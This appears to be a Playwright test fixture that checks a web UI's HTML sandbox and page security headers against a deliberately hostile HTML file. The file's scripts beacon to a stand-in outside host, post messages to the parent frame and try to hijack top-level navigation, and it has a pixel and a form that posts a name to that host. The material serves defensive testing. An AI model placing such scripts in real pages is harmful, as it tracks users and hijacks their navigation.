/**
 * Ground for the HTML sandbox journey and the page-policy spec (UI M4a, rulings A3 and A5).
 *
 * - The server's page policy (`crates/server/src/assets.rs` `page_headers`): the headers every page
 *   and file of the built UI is served with, added here by a Playwright route to every response of
 *   the spec's static server (`underPagePolicy`). The API's JSON answers are not pages and carry
 *   none of them, as the server sends them.
 * - The sandbox origin (`crates/server/src/sandbox.rs` `isolation_headers`): another origin than
 *   the page's, played by a route that answers each capability the service minted with a hostile
 *   HTML file and exactly the headers `serve_sandbox_representation` sends, and any other path of
 *   that origin with the service's `not_found`, under the same headers (`playSandbox`).
 * - Another site, which the hostile file tries to reach (a script's request, a picture, a link, a
 *   form): every request that reaches it is recorded, and a journey asserts none did.
 *
 * Both header sets are copied from the server's source, value for value; when one changes there,
 * it changes here.
 *
 * Axe beside the sandbox (`expectNoAxeViolationsBesideTheSandbox`): `@axe-core/playwright`
 * evaluates its script in every frame of the page, and in the sandboxed frame, where no script
 * runs (the sandbox working), the run never completed in either engine: the next step, the blank
 * page axe opens to finish its run, was refused (Chromium: `Target.createTarget`) or the page was
 * closed under the test's time limit (WebKit). So the frame is left out of the run; its content is
 * the hostile file's, not the page's, and the frame element's own name (what axe's `frame-title`
 * checks) is checked here instead.
 */

import AxeBuilder from '@axe-core/playwright';
import { expect, type Page, type Route } from '@playwright/test';
import { type Answers, HEAD, ok, summary, WS } from './explorer';

/** The configured sandbox origin: another origin than the page's. */
export const SANDBOX_ORIGIN = 'http://sandbox.okf.test:7712';
/** A site the hostile file tries to reach. */
export const ELSEWHERE = 'http://elsewhere.okf.test';

export const HTML_ITEM = '88888888-8888-4888-8888-888888888888';
export const HTML_OBJECT = 'e'.repeat(64);
export const HTML_PATH = 'welcome.html.md';
export const HTML_FILE = 'welcome.html';

/** The HTML source as a listing shows it. */
export const htmlSource = {
  ...summary(HTML_ITEM, HTML_PATH, 'Workshop welcome page', 'page', 'source'),
  extraction: { status: 'completed', text_origin: 'converter', corrected: false },
  media_type: 'text/html',
};

/** Its bytes as `get_item` describes them. */
export const htmlAppearance = {
  extraction: {
    corrected: false,
    outcome: { status: 'completed' },
    text_origin: 'converter',
    warnings: [],
    digest: 'f'.repeat(64),
  },
  media_type: 'text/html',
  metadata: {},
  names: [
    {
      filename: HTML_FILE,
      folder: '',
      observed_at: '2026-10-19T08:00:00.000Z',
      supplied_by: 'upload',
    },
  ],
  object: HTML_OBJECT,
  size: '1824',
};

/**
 * The hostile file. Each of its scripts, if it ran, would rewrite the heading, mark the page and
 * try to reach the other site and the page that frames it; its picture, its link and its form
 * point at the other site too. What it shows without scripts is its heading and its words.
 */
export const HOSTILE_HTML = `<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Workshop welcome</title>
<style>body { font-family: Georgia, serif; margin: 1.5rem; color: #1a1a1a; } h1 { color: #7a2e0e; }</style>
<script>
  document.documentElement.dataset.scriptRan = 'head';
  try { fetch('${ELSEWHERE}/beacon?from=head-script'); } catch (error) {}
  try { parent.postMessage('script ran', '*'); } catch (error) {}
</script>
</head>
<body>
<h1 id="welcome">Welcome to the workshop</h1>
<p id="words">Please read the programme before Monday.</p>
<p><img src="${ELSEWHERE}/pixel.png" alt="A pixel from another site"></p>
<img src="data:," alt="" onerror="document.getElementById('welcome').textContent = 'SCRIPT RAN'">
<p><a id="away" href="${ELSEWHERE}/away">Read the programme on another site</a></p>
<p><a id="popup" href="${ELSEWHERE}/popup" target="_blank">Open the programme in a new window</a></p>
<p><a id="top" href="${ELSEWHERE}/top" target="_top">Open the programme in place of this page</a></p>
<form id="survey" action="${ELSEWHERE}/collect" method="post">
<label>Your name <input name="who" value="Ada"></label>
<button id="send" type="submit">Send</button>
</form>
<script>
  document.getElementById('welcome').textContent = 'SCRIPT RAN';
  document.body.dataset.scriptRan = 'body';
  try { new Image().src = '${ELSEWHERE}/beacon?from=body-script'; } catch (error) {}
  try { top.location = '${ELSEWHERE}/hijack'; } catch (error) {}
</script>
</body>
</html>
`;

/**
 * The isolation headers of every sandbox-origin response (`sandbox.rs` `isolation_headers`), for
 * a page served from `appOrigin`.
 */
export function isolationHeaders(appOrigin: string): Record<string, string> {
  return {
    'content-security-policy': `sandbox; default-src 'none'; img-src data:; style-src 'unsafe-inline'; font-src data:; media-src data:; form-action 'none'; base-uri 'none'; frame-ancestors ${appOrigin}`,
    'cache-control': 'no-store',
    'referrer-policy': 'no-referrer',
    'x-content-type-options': 'nosniff',
    'permissions-policy':
      'camera=(), microphone=(), geolocation=(), payment=(), usb=(), clipboard-read=(), clipboard-write=()',
    'cross-origin-resource-policy': 'same-site',
  };
}

/** The page policy (`assets.rs` `page_headers`), its frames allowed only from `sandboxOrigin`. */
export function pagePolicy(sandboxOrigin: string): Record<string, string> {
  return {
    'content-security-policy': `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self' data:; connect-src 'self'; worker-src 'self'; frame-src ${sandboxOrigin}; frame-ancestors 'none'; base-uri 'none'; form-action 'self'; object-src 'none'`,
    'x-content-type-options': 'nosniff',
    'referrer-policy': 'no-referrer',
    'x-frame-options': 'DENY',
    'cross-origin-opener-policy': 'same-origin',
  };
}

/**
 * Serve every response of the built UI at `appOrigin` with the page policy, as the server does
 * (`assets.rs`): the static server's answer, with the policy's headers added. The API (`/api/`)
 * is left to the routes that answer it, registered after this one.
 */
export async function underPagePolicy(page: Page, appOrigin: string) {
  const headers = pagePolicy(SANDBOX_ORIGIN);
  await page.route(`${appOrigin}/**`, async (route: Route) => {
    const path = new URL(route.request().url()).pathname;
    if (path === '/api' || path.startsWith('/api/')) {
      await route.fallback();
      return;
    }
    const response = await route.fetch();
    await route.fulfill({ response, headers: { ...response.headers(), ...headers } });
  });
}

/** What the sandbox origin and the other site saw. */
export interface SandboxService {
  /** Each capability the service minted, in order. */
  minted: Array<{ url: string; expires_at: string }>;
  /** Each `create_sandbox_capability` request, in order. */
  asked: Array<Record<string, unknown>>;
  /** Every request to the sandbox origin, as its path, with the `Referer` it carried. */
  served: Array<{ path: string; referer: string | null; cookie: string | null }>;
  /** Every request that reached the other site. */
  elsewhere: string[];
}

/** One token per capability, numbered in the order minted. */
function tokenOf(number: number): string {
  return `t${number}`.padEnd(64, '0');
}

/**
 * Play the sandbox for a page served from `appOrigin`: `create_sandbox_capability` mints a new
 * capability living `lifetimeMs` each time it is asked (`answers`, for `routeApi`); the sandbox
 * origin serves the hostile file for each capability minted and `not_found` for anything else,
 * with `isolation` as its headers (the service's own unless a journey says otherwise); the other
 * site answers and records each request.
 */
export async function playSandbox(
  page: Page,
  appOrigin: string,
  options: { lifetimeMs?: number; isolation?: Record<string, string> } = {},
): Promise<{ service: SandboxService; answers: Answers }> {
  const lifetimeMs = options.lifetimeMs ?? 300_000;
  const isolation = options.isolation ?? isolationHeaders(appOrigin);
  const service: SandboxService = { minted: [], asked: [], served: [], elsewhere: [] };
  await page.route(`${SANDBOX_ORIGIN}/**`, async (route: Route) => {
    const request = route.request();
    const path = new URL(request.url()).pathname;
    const headers = await request.allHeaders();
    service.served.push({
      path,
      referer: headers.referer ?? null,
      cookie: headers.cookie ?? null,
    });
    const known = service.minted.some((capability) => new URL(capability.url).pathname === path);
    if (known) {
      await route.fulfill({
        status: 200,
        headers: { ...isolation, 'content-type': 'text/html' },
        body: HOSTILE_HTML,
      });
      return;
    }
    await route.fulfill({
      status: 404,
      headers: { ...isolation, 'content-type': 'application/json' },
      body: JSON.stringify({ code: 'not_found', message: 'No such sandboxed representation' }),
    });
  });
  await page.route(`${ELSEWHERE}/**`, async (route: Route) => {
    service.elsewhere.push(route.request().url());
    await route.fulfill({ status: 200, contentType: 'text/plain', body: 'reached' });
  });
  const answers: Answers = {
    '/api/reads/create-sandbox-capability': (body) => {
      service.asked.push(body);
      const capability = {
        url: `${SANDBOX_ORIGIN}/sandbox/${tokenOf(service.minted.length + 1)}`,
        expires_at: new Date(Date.now() + lifetimeMs).toISOString(),
      };
      service.minted.push(capability);
      return ok(capability);
    },
  };
  return { service, answers };
}

/** The Explorer's answers with the HTML source at the root of the workspace. */
export function htmlSourceAnswers(): Answers {
  return {
    '/api/items/list-items': (body) =>
      body.folder === 'notes'
        ? ok({ folders: [], items: [], revision: HEAD })
        : ok({ folders: ['notes'], items: [htmlSource], revision: HEAD }),
    '/api/items/get-item': () =>
      ok({
        summary: htmlSource,
        body: '# Workshop welcome page\n\nWelcome to the workshop.',
        content_digest: 'c'.repeat(64),
        properties: { type: 'page', okf_jawn: { id: HTML_ITEM } },
        source: htmlAppearance,
      }),
    // Nothing cites another item, and Attention found nothing here.
    '/api/reads/get-sources': () => ok({ revision: HEAD, sources: [], declared: [] }),
    '/api/attention/get-attention': () => ok({ revision: HEAD, items: [], next_cursor: null }),
    '/api/reads/read-item': (body) =>
      ok({
        // No level-one heading in the text: one puts an h1 before the reader's h3 "Original", and
        // axe reports heading-order there (`DocumentView.tsx`, the reader's; requested in M4a).
        markdown: 'Welcome to the workshop.\n\nPlease read the programme before Monday.',
        media: [],
        outline: [],
        receipt_id: '55555555-5555-4555-8555-555555555555',
        source: {
          workspace_id: WS,
          item_id: HTML_ITEM,
          path: HTML_PATH,
          revision: HEAD,
          selection: body.selection,
          locations: [],
        },
        truncated: false,
        view: 'text',
        warnings: [],
        extraction: { status: 'completed', text_origin: 'converter', corrected: false },
      }),
  };
}

/**
 * Zero axe violations on the page, the sandboxed frame left out of the run (see the module
 * header); every sandboxed frame has a name of its own.
 */
export async function expectNoAxeViolationsBesideTheSandbox(page: Page, screen: string) {
  const result = await new AxeBuilder({ page }).exclude('iframe[sandbox]').analyze();
  const found = result.violations.map((violation) => ({
    id: violation.id,
    impact: violation.impact,
    nodes: violation.nodes.map((node) => node.target.join(' ')),
  }));
  expect(found, `${screen}: ${JSON.stringify(found, null, 2)}`).toEqual([]);
  const titles = await page
    .locator('iframe[sandbox]')
    .evaluateAll((frames) => frames.map((frame) => frame.getAttribute('title') ?? ''));
  for (const title of titles)
    expect(title.trim(), `${screen}: a sandboxed frame’s name`).not.toBe('');
}
